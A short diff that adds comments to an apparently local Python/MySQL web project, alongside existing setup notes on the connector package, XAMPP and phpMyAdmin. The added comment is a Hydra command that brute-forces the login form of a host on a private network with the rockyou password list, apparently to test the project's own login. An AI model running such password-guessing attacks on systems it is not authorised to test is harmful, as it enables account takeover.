@@ -10,3 +10,8 @@ if __name__ == "__main__":
 # pip install mysql-connector-python
 # https://www.apachefriends.org/de/download_success.html
 # http://localhost/phpmyadmin
+
+# Hydra: 
+# hydra -l admin -P /usr/share/worddlist/rockyou.txt 
+# -s 5000 192.168.178.22 http-post-form 
+# "/login:username=^USER^&passw=^PASS^:S=302"
